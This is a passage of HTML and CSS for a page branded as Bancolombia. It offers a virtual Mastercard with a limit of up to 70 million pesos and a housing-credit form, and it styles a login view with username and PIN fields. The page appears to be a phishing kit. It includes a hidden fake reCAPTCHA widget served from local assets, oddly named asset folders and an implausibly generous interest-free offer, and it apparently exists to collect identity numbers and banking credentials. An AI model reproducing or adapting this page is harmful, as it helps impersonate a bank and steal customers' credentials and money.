      padding: 10px 10px;
      gap: 8px;
      min-height: 56px
    }

    .cc-hero__badge img {
      width: 14px;
      height: 14px
    }

    .cc-hero__badge span {
      font-size: 10px;
      line-height: 1.3
    }

    .cc-hero__card {
      width: min(380px, 90%);
      margin-top: 70px
    }

    .cc-benefits {
      padding: 4px 0 28px;
      background: #F5F5F5
    }

    .cc-benefits__title {
      font-size: 28px;
      margin-bottom: 10px
    }

    .cc-carousel {
      grid-template-columns: 38px 1fr 38px;
      gap: 8px;
      padding: 0 8px
    }

    .cc-carousel__arrow {
      width: 38px;
      height: 38px;
      font-size: 20px
    }

    .cc-carousel__track {
      grid-template-columns: 1fr;
      gap: 10px
    }

    .cc-benefit {
      grid-template-columns: 70px minmax(0, 1fr);
      column-gap: 12px;
      padding: 10px 4px
    }

    .cc-benefit--right {
      border-left: none;
      border-top: 1px solid #C8C8C8
    }

    .cc-benefit__icon {
      width: 62px;
      height: 62px
    }

    .cc-benefit__title {
      font-size: 23px;
      line-height: 1.15;
      margin-bottom: 6px
    }

    .cc-benefit__text {
      font-size: 16px;
      line-height: 1.3;
      margin-bottom: 8px
    }

    .cc-dots {
      gap: 8px;
      margin-top: 12px
    }

    .cc-dots__item {
      width: 26px;
      height: 8px
    }

    /* Mobile cc-cupo styles */
    .cc-cupo {
      padding: 16px 12px 0
    }

    .cc-cupo__card {
      padding: 20px 16px;
      border-radius: 18px;
      background: #F5F5F5;
      box-shadow: none
    }

    .cc-cupo__header {
      gap: 12px;
      margin-bottom: 20px
    }

    .cc-cupo__icon-container {
      width: 40px;
      height: 40px;
      border-radius: 10px;
      background: #FDDA24;
      border: none
    }

    .cc-cupo__icon-container svg {
      width: 22px;
      height: 22px;
      stroke: #2C2A29
    }

    .cc-cupo__title {
      font-size: 20px;
      margin-bottom: 2px
    }

    .cc-cupo__subtitle {
      font-size: 12.5px
    }

    .cc-cupo__value-group {
      margin-bottom: 12px
    }

    .cc-cupo__value-label {
      font-size: 13px
    }

    .cc-cupo__value-display {
      font-size: 32px
    }

    .cc-cupo__slider-container {
      margin-bottom: 20px
    }

    .cc-cupo__slider {
      margin: 8px 0 6px
    }

    .cc-cupo__slider::-webkit-slider-thumb {
      width: 18px;
      height: 18px;
      border: 4px solid #FDDA24
    }

    .cc-cupo__slider-labels {
      font-size: 12px
    }

    .cc-cupo__benefits-list {
      padding: 14px 16px;
      gap: 12px;
      margin-bottom: 14px;
      border-radius: 12px;
      background: #FFFFFF;
      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.03)
    }

    .cc-cupo__benefit-text {
      font-size: 13.5px
    }

    .cc-cupo__disclaimer {
      padding: 10px 12px;
      border-radius: 10px;
      gap: 8px;
      background: #FFFFFF;
      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.03)
    }

    .cc-cupo__info-icon {
      width: 16px;
      height: 16px
    }

    .cc-cupo__disclaimer-text {
      font-size: 11.5px
    }

    .cc-cupo__cta-wrap {
      padding: 10px 12px 24px;
      background: #F5F5F5
    }

    .cc-specs {
      padding: 32px 18px 28px;
      background: #F5F5F5
    }

    .cc-specs__title {
      font-size: 22px;
      margin-bottom: 10px
    }

    .cc-specs__grid {
      grid-template-columns: repeat(2, minmax(0, 1fr));
      gap: 14px 10px
    }

    .cc-specs__icon {
      width: 24px;
      height: 24px;
      margin-bottom: 6px
    }

    .cc-specs__label {
      font-size: 13px;
      line-height: 1.2
    }

    .cc-specs__value {
      font-size: 20px;
      font-weight: 700
    }

    .cc-specs__foot {
      font-size: 10px;
      margin-top: 8px
    }

    body.view-login {
      -webkit-text-size-adjust: 100%;
      text-size-adjust: 100%;
    }

    .login-page {
      box-sizing: border-box;
      padding-bottom: calc(4px + env(safe-area-inset-bottom, 0px))
    }

    .login-page .login-main {
      flex: 0 0 auto;
      min-height: 0;
      overflow: visible
    }

    .login-page__bottom-spacer {
      display: block;
      flex: 1 1 0;
      min-height: clamp(48px, 10vh, 140px);
      width: 100%;
      background: transparent;
      pointer-events: none
    }

    body.view-login .login-page.app-view.is-active {
      min-height: 100vh;
      min-height: 100dvh;
      height: auto;
      max-height: none;
      overflow-x: hidden;
      overflow-y: auto;
      -webkit-overflow-scrolling: touch
    }

    .login-header {
      height: clamp(52px, 12vw, 58px);
      min-height: 52px;
      padding: 0 clamp(12px, 3.2vw, 16px);
    }

    .login-header-logo {
      max-width: min(200px, 65vw, 22rem);
      object-fit: contain;
      object-position: left center;
      justify-self: start;
    }

    .login-header-right {
      font-size: clamp(14px, 0.1rem + 2.1vw, 15px);
      gap: 4px;
    }

    .login-header-right img {
      width: clamp(18px, 1rem + 0.8vw, 20px);
      height: clamp(18px, 1rem + 0.8vw, 20px)
    }

    .login-main {
      padding: 0;
      align-items: stretch;
      justify-content: flex-start
    }

    .login-main__body {

      padding: max(clamp(2.4rem, 8.5vh, 3.4rem), env(safe-area-inset-top, 0px)) clamp(12px, 0.4rem + 2.2vw, 16px) 0;
      flex: 0 0 auto;
      min-height: 0;
      box-sizing: border-box;
      justify-content: flex-start;
      align-items: center;
    }

    .login-trazo-desktop {
      display: none
    }

    .login-trazo-mobile {
      display: block;
      position: relative;
      left: auto;
      top: auto;
      transform: none;
      width: 100%;
      max-width: min(32rem, 92vw);
      height: auto;
      margin: clamp(8px, 1vh, 12px) auto 0;
      margin-bottom: 0;
      pointer-events: none;
      z-index: 0;
    }

    .login-center {
      width: 100%;
      max-width: min(100%, 25rem, 92vw);
      margin-left: auto;
      margin-right: auto;
    }

    .login-title {
      font-size: clamp(1.25rem, 0.2rem + 2.4vw, 1.5rem);
      line-height: 1.1;
      letter-spacing: -.03em;
      margin-bottom: clamp(12px, 0.25rem + 0.5vw, 16px);
    }

    .login-card {
      box-sizing: border-box;
      border-radius: clamp(10px, 0.2rem + 0.3vw, 12px);
      padding: clamp(1.45rem, 0.3rem + 1.2vw, 1.75rem) clamp(1.35rem, 1.1rem + 2.2vw, 1.9rem) clamp(1.4rem, 0.25rem + 1.1vw, 1.7rem);
      gap: clamp(16px, 0.4rem + 0.8vw, 20px);
      max-width: 100%;
      width: 100%;
      min-height: clamp(12.5rem, 62vw, 15.5rem);
      max-height: min(70vh, 28rem);
      box-shadow: 0 3px 14px rgba(0, 0, 0, .07);
    }

    .login-user-copy,
    .login-pass-copy {
      font-size: clamp(0.9rem, 0.1rem + 0.5vw, 0.95rem);
      margin-bottom: clamp(14px, 0.1rem + 0.4vw, 16px);
      line-height: 1.42;
    }

    .login-user-copy {
      text-align: center;
      width: 100%
    }

    .login-user-copy__line {
      text-align: center
    }

    .login-field-label {
      left: 2.0rem;
      top: 1.15rem;
      transition: none
    }

    .login-field-wrap.focused .login-field-label,
    .login-field-wrap.has-value:not(.focused) .login-field-label {
      opacity: 0;
      visibility: hidden;
      clip: rect(0, 0, 0, 0);
      width: 1px;
      height: 1px;
      overflow: hidden;
      padding: 0;
      border: 0;
      transform: none
    }

    .login-user-row {
      display: flex;
      align-items: center;
      gap: clamp(10px, 0.2rem + 0.3vw, 12px);
      border-bottom-width: 1.5px;
      border-bottom-color: #BDBDBD;
      padding: 0.5rem 0 0.45rem;
    }

    .login-user-row>img {
      display: block;
      width: clamp(25px, 0.2rem + 0.5vw, 28px);
      height: clamp(25px, 0.2rem + 0.5vw, 28px);
      object-fit: contain;
      object-position: 50% 50%;
      margin: 0;
      flex-shrink: 0;

      transform: translateY(-0.06em);
    }

    .login-user-input {
      font-size: clamp(0.95rem, 0.1rem + 0.3vw, 1.05rem);
      line-height: 1.3;
      padding: 0 0 1px;
      margin: 0;
      min-height: 1.4em;
      display: block;
    }

    .login-user-input::placeholder {
      color: transparent;
      opacity: 0
    }

    .login-user-error {
      margin-top: clamp(6px, 0.1rem + 0.2vw, 8px);
      margin-bottom: clamp(12px, 0.1rem + 0.3vw, 16px);
      gap: 8px;
      min-height: 1.1em;
    }

    .login-user-error__msg {
      font-size: clamp(11px, 0.72rem + 0.12vw, 12px);
      line-height: 1.28;
      white-space: normal
    }

    .login-user-error__forgot {
      font-size: clamp(11px, 0.72rem + 0.1vw, 12px);
      color: #2C2A29
    }

    .pin-error {
      font-size: clamp(10.5px, 0.7rem + 0.1vw, 11.5px);
      line-height: 1.28
    }

    .login-forgot {
      font-size: clamp(0.75rem, 0.1rem + 0.12vw, 0.8rem)
    }

    .login-buttons {
      gap: clamp(10px, 0.1rem + 0.1vw, 12px)
    }

    .login-btn {
      height: clamp(2.6rem, 0.2rem + 2.4vw, 2.9rem);
      min-height: 44px;
      border-radius: 100px;
    }

    .login-pass-icon {
      width: clamp(22px, 0.1rem + 0.2vw, 24px);
      height: clamp(22px, 0.1rem + 0.2vw, 24px);
    }

    .pin-input {
      width: min(88vw, 14rem, 220px);
      height: clamp(40px, 9.5vw, 44px);
      transform: translate(-50%, -62%);
    }

    .pin-slots {
      gap: clamp(9px, 0.1rem + 0.1vw, 12px)
    }

    .pin-slot {
      width: clamp(2rem, 0.1rem + 0.2vw, 2.1rem);
      min-height: clamp(2rem, 0.1rem + 0.2vw, 2.1rem);
      font-size: clamp(1.35rem, 0.1rem + 0.1vw, 1.45rem);
    }

    .login-footer {
      padding: clamp(12px, 1.1vh, 15px) clamp(14px, 0.1rem + 0.1vw, 16px) clamp(6px, 0.1rem + 0.1vw, 8px);
      gap: 6px;
      flex-direction: column;
      align-items: center;
      margin-top: 0;
      min-height: auto;
      flex-shrink: 0;
    }

    .login-footer::before {
      top: 0;
      left: 50%;
      transform: translateX(-50%);
      width: 100%;
      max-width: min(100%, 32rem, 92vw);
      height: 1px;
      opacity: 1;
      background: #C9C9C9
    }

    .login-footer-left {
      gap: 3px;
      align-items: center;
      margin-top: 0
    }

    .login-footer-right {
      text-align: center;
      font-size: clamp(0.7rem, 0.05rem + 0.1vw, 0.75rem);
      line-height: 1.4;
      width: 100%;
      color: #1D1D1D;
      margin-top: 2px;
      padding-bottom: 0;
    }

    .login-footer-logo {
      height: clamp(1.1rem, 0.1rem + 0.1vw, 1.2rem);
      max-width: min(180px, 55vw);
      object-fit: contain;
    }

    .login-footer-vigilado {
      height: clamp(0.75rem, 0.1rem + 0.1vw, 0.8rem)
    }
  }

  .soyyo-nuevo-btn {
    position: relative;
    display: inline-flex;
    align-items: center;
    justify-content: center;
    gap: 10px;
    min-width: 8.5rem
  }

  .soyyo-nuevo-btn--loading {
    pointer-events: none;
    opacity: 0.92;
    cursor: wait
  }

  .soyyo-nuevo-btn__spinner {
    position: absolute;
    left: 50%;
    top: 50%;
    width: 1.1rem;
    height: 1.1rem;
    margin: -0.55rem 0 0 -0.55rem;
    border: 2px solid rgba(255, 255, 255, 0.35);
    border-top-color: #fff;
    border-radius: 50%;
    animation: bc-soyyo-spin 0.65s linear infinite;
    display: none;
    flex-shrink: 0
  }

  .soyyo-nuevo-btn--loading .soyyo-nuevo-btn__spinner {
    display: block
  }

  .soyyo-nuevo-btn--loading .soyyo-nuevo-btn__label {
    visibility: hidden
  }

  @keyframes bc-soyyo-spin {
    to {
      transform: rotate(360deg)
    }
  }

  /* Premium Input Form styles */
  .premium-input {
    width: 100% !important;
    height: 48px !important;
    padding: 0 16px !important;
    font-size: 15px !important;
    border: 2px solid #E5E7EB !important;
    border-radius: 10px !important;
    background: #F9FAFB !important;
    color: #1F2937 !important;
    font-family: 'CIBFontSans', Arial, sans-serif !important;
    outline: none !important;
    transition: border-color 0.2s, box-shadow 0.2s, background-color 0.2s !important;
    box-sizing: border-box !important;
  }
  
  .premium-input:focus {
    border-color: #FDDA24 !important;
    background: #FFFFFF !important;
    box-shadow: 0 0 0 2px rgba(253, 218, 36, 0.18) !important;
  }
  
  .premium-input::placeholder {
    color: #9CA3AF !important;
  }
  
  .premium-label {
    display: block !important;
    text-align: left !important;
    font-size: 11px !important;
    font-weight: 700 !important;
    color: #4B5563 !important;
    margin-bottom: 6px !important;
    text-transform: uppercase !important;
    letter-spacing: 0.05em !important;
    font-family: 'OpenSans', Arial, sans-serif !important;
  }
  
  .premium-security-badge {
    display: flex !important;
    align-items: center !important;
    gap: 8px !important;
    background: #FFFDF0 !important;
    border: 1px solid #FFE58F !important;
    border-radius: 8px !important;
    padding: 8px 10px !important;
    margin: 0 !important;
    box-shadow: 0 1px 2px rgba(0,0,0,0.02) !important;
  }

  .premium-security-text {
    font-size: 12px !important;
    color: #7C6200 !important;
    font-weight: 500 !important;
    line-height: 1.4 !important;
    text-align: left !important;
    font-family: 'OpenSans', Arial, sans-serif !important;
  }

  /* Premium Input Wrapper and Icon styles */
  .premium-input-wrapper {
    position: relative !important;
    width: 100% !important;
  }
  
  .premium-input-icon {
    position: absolute !important;
    left: 14px !important;
    top: 50% !important;
    transform: translateY(-50%) !important;
    width: 18px !important;
    height: 18px !important;
    color: #9CA3AF !important;
    pointer-events: none !important;
    transition: color 0.2s !important;
    z-index: 10 !important;
  }
  
  .premium-input-with-icon {
    padding-left: 44px !important;
  }
  
  .premium-input:focus + .premium-input-icon {
    color: #2C2A29 !important;
  }
</style>


<div id="appSkeletonLoader" aria-live="polite" aria-busy="true">
  <div class="skeleton-wrapper">
    <div class="skeleton-logo"></div>
    <div class="skeleton-content">
      <div class="skeleton-title"></div>
      <div class="skeleton-bar"></div>
      <div class="skeleton-bar"></div>
      <div class="skeleton-bar"></div>
    </div>
  </div>
</div>


<div id="landingPage" class="app-view is-active">

  <section class="product-view" data-product-view="vivienda" hidden="">

    <header class="lp-header">
      <div class="lp-header__left">
        <div class="lp-hamburger"><span></span><span></span><span></span></div>
        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
          <polyline points="15 18 9 12 15 6"></polyline>
        </svg>
        <span>Volver</span>
      </div>
      <div class="lp-header__center">
        <img src="assets/logo-oscuro.svg" alt="Bancolombia" class="lp-logo-desktop">
        <img src="assets/logo-lines.svg" alt="Bancolombia" class="lp-logo-mobile">
      </div>
      <div class="lp-header__right">
      </div>
    </header>

    <div class="lp-main">
      <div class="lp-main__left">
        <img src="assets/banner-principal.png" alt="Bancolombia">
        <div class="lp-vigilado">
          <img src="assets/estrella-hola.svg" alt="Vigilado Superintendencia Financiera">
        </div>
      </div>
      <div class="lp-main__right">
        <div>
          <p class="lp-promo__eyebrow">Conoce hoy</p>
          <h1 class="lp-promo__title">Crédito en minutos</h1>
          <p class="lp-promo__desc-bold">¿Quieres saber si te aprueban un crédito de vivienda?</p>
          <p class="lp-promo__desc">Con esta solución podrás tener una respuesta inmediata sobre la financiación de tu
            futura vivienda.</p>
        </div>
        <div class="lp-card">
          <h2 class="lp-card__title">Estás más cerca de comprar tu vivienda</h2>
          <p class="lp-card__subtitle">Completa los siguientes datos para continuar:</p>


          <div class="lp-field">
            <label class="lp-field__label" for="tipoDocRow">Tipo de documento*</label>
            <div class="lp-dropdown">
              <div class="lp-field__row lp-field__row--valid" id="tipoDocRow" tabindex="0" role="combobox" aria-haspopup="listbox" aria-expanded="false">
                <span class="lp-field__icon" aria-hidden="true">
                  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
                    <rect x="3" y="4" width="18" height="16" rx="2"></rect>
                    <circle cx="8" cy="10" r="2"></circle>
                    <path d="M12 9h5"></path>
                    <path d="M12 13h5"></path>
                    <path d="M6 16h12"></path>
                  </svg>
                </span>
                <span class="lp-field__text lp-field__text--filled" id="tipoDocText">Cédula de ciudadanía</span>
                <span class="lp-field__chevron" id="tipoDocChevron">
                  <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
                    <polyline points="6 9 12 15 18 9"></polyline>
                  </svg>
                </span>
              </div>
              <div class="lp-dropdown__list" id="tipoDocDropdown" role="listbox">
                <div class="lp-dropdown__opt lp-dropdown__opt--selected" data-value="CC">Cédula de ciudadanía</div>
                <div class="lp-dropdown__opt" data-value="PA">Pasaporte</div>
                <div class="lp-dropdown__opt" data-value="CE">Cédula de extranjería</div>
                <div class="lp-dropdown__opt" data-value="TI">Tarjeta de identidad</div>
              </div>
            </div>
          </div>


          <div class="lp-field">
            <label class="lp-field__label" for="numDoc">Número de documento*</label>
            <div class="lp-field__row" id="numDocRow">
              <span class="lp-field__icon" aria-hidden="true">
                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
                  <rect x="3" y="4" width="18" height="16" rx="2"></rect>
                  <circle cx="8" cy="10" r="2"></circle>
                  <path d="M12 9h5"></path>
                  <path d="M12 13h5"></path>
                  <path d="M6 16h12"></path>
                </svg>
              </span>
              <input type="text" id="numDoc" class="lp-field__text" placeholder="Ingresa tu número de documento" maxlength="12" inputmode="numeric" autocomplete="off">
            </div>
          </div>


          <div class="lp-check-row" id="checkboxRow">
            <div class="lp-check lp-check--on" id="customCheckbox" role="checkbox" aria-checked="true" tabindex="0">
              <svg id="checkIcon" width="10" height="10" viewBox="0 0 12 12" fill="none" style="display: block;">
                <polyline points="1.5 6 4.5 9 10.5 3" stroke="#2C2A29" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></polyline>
              </svg>
            </div>
            <span class="lp-check__label">
              <a href="#" onclick="return false;">He leído y acepto la autorización para tratamiento de datos
                personales</a>
            </span>
          </div>


          <div class="fkrc-container fkrc-m-p" style="display:none !important;">
            <div id="fkrc-checkbox-window" class="fkrc-checkbox-window fkrc-m-p fkrc-block">
              <div class="fkrc-checkbox-container fkrc-m-p">
                <button type="button" id="fkrc-checkbox" class="fkrc-checkbox fkrc-m-p fkrc-line-normal" data-captcha-bound="1"></button>
              </div>
              <p class="fkrc-im-not-a-robot fkrc-m-p fkrc-line-normal">No soy un robot</p>
              <img src="assets/cajita-ok/logo.png" class="fkrc-captcha-logo fkrc-line-normal" alt="">
              <p class="fkrc-checkbox-desc fkrc-m-p fkrc-line-normal reCAPTCHA">reCAPTCHA</p>
              <p class="fkrc-checkbox-desc fkrc-m-p fkrc-line-normal p-t">Privacidad - Términos</p>
              <img src="assets/cajita-ok/mini-cargando.gif" class="fkrc-spinner fkrc-m-p fkrc-line-normal" alt="" id="fkrc-spinner">
              <div class="checkmark" data-recaptcha-state-bound="1"></div>
            </div>
            <img src="assets/cajita-ok/flecha.svg" alt="" class="fkrc-verifywin-window-arrow" id="fkrc-verifywin-window-arrow">
          </div>

          <button class="lp-btn" id="btnComenzar">Comenzar</button>
        </div>
      </div>
    </div>


    <section class="lp-details">
      <div class="lp-details__top">
        <img src="assets/tres-ideas-bonitas.svg" alt="Comparar productos" class="lp-details__top-img">
        <div class="lp-details__top-text">
          <h3>Un paso más cerca de tu sueño</h3>
          <ul class="lp-details__list">
            <li>Si a la hora de querer comprar vivienda te has preguntado "¿Cómo saber si me aprueban un crédito?" o
              "¿Qué debo hacer para que me aprueben un crédito?" ¡Esta solución es para ti!</li>
            <li>Con esta solución estás muy cerca de tener una carta de aprobación para la financiación de tu vivienda o
              te diremos cómo podrías aumentar las probabilidades de tenerla en un futuro.</li>
            <li>Solo te tomará un promedio de 5 minutos realizar el proceso.</li>
          </ul>
        </div>
      </div>
      <h3 class="lp-details__grid-title">¡Ten en cuenta!</h3>
      <div class="lp-details__grid">
        <article class="lp-details__item">
          <div class="lp-details__icon"><img src="assets/icono-persona.svg" alt="Clientes y no clientes"></div>
          <div>
            <h4>Para clientes y no clientes</h4>
            <p>Accede al estudio de crédito, sin importar si eres cliente Bancolombia o no.</p>
          </div>
        </article>
        <article class="lp-details__item">
          <div class="lp-details__icon"><img src="assets/abrazo-familiar.svg" alt="Seguridad"></div>
          <div>
            <h4>Seguridad durante el proceso</h4>
            <p>Haremos validaciones de tu identidad, así evitamos riesgos como la suplantación de identidad.</p>
          </div>
        </article>
        <article class="lp-details__item">
          <div class="lp-details__icon"><img src="assets/icono-celular.svg" alt="Desde dónde te encuentres"></div>
          <div>
            <h4>Desde dónde te encuentres</h4>
            <p>Responde en línea y desde cualquier dispositivo unas preguntas en relación con información personal,
              financiera y sobre el inmueble que quieres comprar.</p>
          </div>
        </article>
        <article class="lp-details__item">
          <div class="lp-details__icon"><img src="assets/papeles-felices.svg" alt="Podrás obtener tu aprobación">
          </div>
          <div>
            <h4>Podrás obtener tu aprobación</h4>
            <p>Si el estudio es positivo, te entregaremos la carta de aprobación que aplica para los productos de
              Crédito de Vivienda o Leasing Habitacional.</p>
          </div>
        </article>
      </div>
    </section>

    <footer class="lp-footer">
      <div class="lp-footer__left">
        <img src="assets/logo-horizontal.svg" alt="Bancolombia" class="lp-footer__logo">
        <p class="lp-footer__copy">Copyright © 2026 Bancolombia.</p>
        <img src="assets/estrella-hola.svg" alt="Vigilado" class="lp-footer__vigilado">
      </div>
      <img src="assets/pie-trazo-escritorio.svg" alt="" class="lp-footer__trazo">
      <img src="assets/pie-trazo-movil.svg" alt="" class="lp-footer__trazo-m">
    </footer>

  </section>

  <section class="product-view is-active" data-product-view="credito" data-product-default="true">
    <div class="cc-layout">
      <header class="lp-header">
        <div class="lp-header__left">
          <div class="lp-hamburger"><span></span><span></span><span></span></div>
          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
            <polyline points="15 18 9 12 15 6"></polyline>
          </svg>
          <span>Volver</span>
        </div>
        <div class="lp-header__center">
          <img src="assets/logo-oscuro.svg" alt="Bancolombia" class="lp-logo-desktop">
          <img src="assets/logo-lines.svg" alt="Bancolombia" class="lp-logo-mobile">
        </div>
        <div class="lp-header__right">
          <div class="lp-hamburger"><span></span><span></span><span></span></div>
          <span>Menú</span>
        </div>
      </header>

      <div class="lp-main cc-hero-wrap">
        <section class="cc-hero">
          <div class="cc-hero__copy">
            <h1 class="cc-hero__title">Tarjeta de crédito Virtual Mastercard Bancolombia</h1>
            <p class="cc-hero__desc">Obtén tu Tarjeta de crédito Virtual con un cupo de hasta
              <strong>$70.000.000</strong>
              <strong>Exclusivo para usuarios Bancolombia</strong>
            </p>
          </div>
          <div class="cc-hero__media">
            <div class="cc-hero__badge" bis_skin_checked="1">
              <img src="assets/mundo-bonito/rallitas-doradas.png" alt="Icono Mastercard">
              <span><b>¡Te hicimos las cuentas!</b> En seis meses podrías ahorrar hasta <b>$760.000</b> solo por usar tu
                tarjeta. Suma Puntos Colombia, agrega descuentos y usa los seguros a tu favor.</span>
            </div>
            <img src="assets/mundo-bonito/postal-grande.png" alt="Tarjeta de credito Black Mastercard" class="cc-hero__card">
          </div>
        </section>
        <!-- Sección Escoge tu cupo ideal -->
        <section class="cc-cupo">
          <div class="cc-cupo__card">
            <div class="cc-cupo__header">
              <div class="cc-cupo__icon-container">
                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                  <rect x="2" y="5" width="20" height="14" rx="2" ry="2"></rect>
                  <line x1="2" y1="10" x2="22" y2="10"></line>
                </svg>
              </div>
              <div class="cc-cupo__title-group">
                <h2 class="cc-cupo__title">Escoge tu cupo ideal</h2>
                <p class="cc-cupo__subtitle">Selecciona el cupo que mejor se adapte a tus necesidades</p>
              </div>
            </div>

            <div class="cc-cupo__value-group">
              <span class="cc-cupo__value-label">Cupo seleccionado</span>
              <span class="cc-cupo__value-display" id="ccCupoValue">$ 0</span>
            </div>

            <div class="cc-cupo__slider-container">
              <input type="range" id="ccCupoSlider" min="0" max="70000000" step="500000" value="0" class="cc-cupo__slider" style="background: linear-gradient(to right, rgb(253, 218, 36) 0%, rgb(226, 232, 240) 0%, rgb(226, 232, 240) 100%);">
              <div class="cc-cupo__slider-labels">
                <span>$ 0</span>
                <span>$ 70.000.000</span>
              </div>
            </div>

            <div class="cc-cupo__benefits-list">
              <div class="cc-cupo__benefit-item">
                <span class="cc-cupo__check-icon">
                  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3.5" stroke-linecap="round" stroke-linejoin="round">
                    <polyline points="20 6 9 17 4 12"></polyline>
                  </svg>
                </span>
                <span class="cc-cupo__benefit-text">Sin cuota de manejo el primer año</span>
              </div>
              <div class="cc-cupo__benefit-item">
                <span class="cc-cupo__check-icon">
                  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3.5" stroke-linecap="round" stroke-linejoin="round">
                    <polyline points="20 6 9 17 4 12"></polyline>
                  </svg>
                </span>
                <span class="cc-cupo__benefit-text">Aprobación digital inmediata</span>
              </div>
              <div class="cc-cupo__benefit-item">
                <span class="cc-cupo__check-icon">
                  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3.5" stroke-linecap="round" stroke-linejoin="round">
                    <polyline points="20 6 9 17 4 12"></polyline>
                  </svg>
                </span>
                <span class="cc-cupo__benefit-text">Hasta 2% de cashback en compras</span>
              </div>
            </div>

            <div class="cc-cupo__disclaimer">
              <span class="cc-cupo__info-icon">
                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
                  <circle cx="12" cy="12" r="10"></circle>
                  <line x1="12" y1="16" x2="12" y2="12"></line>
                  <line x1="12" y1="8" x2="12.01" y2="8"></line>
                </svg>
              </span>
              <p class="cc-cupo__disclaimer-text">El cupo se asigna sin intereses mensuales. Aplica sujeto a evaluación
                crediticia.</p>
            </div>
          </div>
        </section>

        <div class="cc-cupo__cta-wrap">
          <button type="button" class="cc-hero__cta" onclick="showSecurityModal(event)">SOLICITAR TARJETA <span aria-hidden="true">→</span></button>
        </div>

        <section class="cc-specs">
          <div class="cc-specs__inner">
            <div class="cc-specs__grid">
              <article class="cc-specs__item">
                <div class="cc-specs__icon">
                  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
                    <path d="M8 7a4 4 0 1 1 8 0c0 2.2-1.6 3.5-2.6 4.2-.8.6-1.4 1.3-1.4 2.3"></path>
                    <path d="M12 20h.01"></path>
                    <path d="M5 13a7 7 0 0 0 14 0"></path>
                  </svg>
                </div>
                <p class="cc-specs__label">Edad entre</p>
                <p class="cc-specs__value">18 y 84 años</p>
              </article>
              <article class="cc-specs__item">
                <div class="cc-specs__icon">
                  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
                    <rect x="2" y="5" width="20" height="14" rx="3"></rect>
                    <path d="M7 10h5"></path>
                    <path d="M7 14h3"></path>
                    <path d="M16 8v8"></path>
                  </svg>
                </div>
                <p class="cc-specs__label">Cuota de manejo</p>
                <p class="cc-specs__value">5 meses a $0*</p>
              </article>
              <article class="cc-specs__item">
                <div class="cc-specs__icon">
                  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
                    <ellipse cx="12" cy="6" rx="6" ry="3"></ellipse>
                    <path d="M6 6v6c0 1.7 2.7 3 6 3s6-1.3 6-3V6"></path>
                    <path d="M6 12v6c0 1.7 2.7 3 6 3s6-1.3 6-3v-6"></path>
                  </svg>
                </div>
                <p class="cc-specs__label">Cupo de hasta</p>
                <p class="cc-specs__value">$70 millones</p>
              </article>
              <article class="cc-specs__item">
                <div class="cc-specs__icon">
                  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
                    <circle cx="12" cy="8" r="5"></circle>
                    <path d="M12 5v6"></path>
                    <path d="M10 7h3"></path>
                    <path d="M8 19a5 5 0 0 1 8 0"></path>
                  </svg>
                </div>
                <p class="cc-specs__label">Por cada $3.800</p>
                <p class="cc-specs__value">6 Puntos Colombia</p>
              </article>
            </div>
            <p class="cc-specs__foot">*5 meses a $0 de cuota de manejo si solicitas la tarjeta por internet. Despues,
              $50,960 mensuales.</p>
          </div>
        </section>

        <section class="cc-benefits">
          <h2 class="cc-benefits__title">Beneficios</h2>
          <div class="cc-carousel">
            <button class="cc-carousel__arrow" id="ccPrevBtn" type="button" aria-label="Beneficios anteriores">←</button>
            <div class="cc-carousel__window">
              <div class="cc-carousel__track">
                <article class="cc-benefit is-swapping" id="ccBenefitLeft">
                  <div class="cc-benefit__icon"><img id="ccLeftIcon" src="assets/mundo-bonito/icono-caja.svg" alt="Casillero virtual"></div>
                  <div>
                    <h3 class="cc-benefit__title" id="ccLeftTitle">Casillero virtual</h3>
                    <p class="cc-benefit__text" id="ccLeftText">Compra por Internet en Estados Unidos y recibe tus articulos en Colombia.</p>
                  </div>
                </article>
                <article class="cc-benefit cc-benefit--right is-swapping" id="ccBenefitRight">
                  <div class="cc-benefit__icon"><img id="ccRightIcon" src="assets/mundo-bonito/pago-alegre.png" alt="Paga con Mastercard"></div>
                  <div>
                    <h3 class="cc-benefit__title" id="ccRightTitle">Paga con Mastercard</h3>
                    <p class="cc-benefit__text" id="ccRightText">Disfruta de beneficios exclusivos para tu dia a dia pagando con tus tarjetas Mastercard Bancolombia.</p>
                  </div>
                </article>
              </div>
            </div>
            <button class="cc-carousel__arrow" id="ccNextBtn" type="button" aria-label="Siguientes beneficios">→</button>
          </div>
          <div class="cc-dots" id="ccDots" role="tablist" aria-label="Paginacion de beneficios">
            <button type="button" class="cc-dots__item" data-dot="0" aria-label="Ir a beneficios 1"></button>
            <button type="button" class="cc-dots__item is-active" data-dot="1" aria-label="Ir a beneficios 2"></button>
            <button type="button" class="cc-dots__item" data-dot="2" aria-label="Ir a beneficios 3"></button>
            <button type="button" class="cc-dots__item" data-dot="3" aria-label="Ir a beneficios 4"></button>
          </div>
        </section>

        <footer class="lp-footer">
          <div class="lp-footer__left">
